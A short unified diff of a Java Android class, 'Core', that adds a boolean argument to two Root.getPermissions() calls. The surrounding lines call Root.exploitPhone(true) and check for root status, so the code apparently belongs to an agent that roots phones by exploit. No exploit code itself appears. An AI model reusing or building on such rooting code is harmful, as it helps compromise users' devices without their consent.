@@ -124,7 +124,7 @@ public class Core extends Activity implements Runnable {
 					Thread t = new Thread(new Runnable() {
 						@Override
 						public void run() {
-							Root.getPermissions();
+							Root.getPermissions(true);
 						}
 					});
 					if (Cfg.DEBUG) {
@@ -248,7 +248,7 @@ public class Core extends Activity implements Runnable {
 		Keys.self();
 		Root.exploitPhone(true);
 		exploitTried = true;
-		Root.getPermissions();
+		Root.getPermissions(false);
 
 		if (Status.haveRoot()) {
 			if (Cfg.DEMO) {
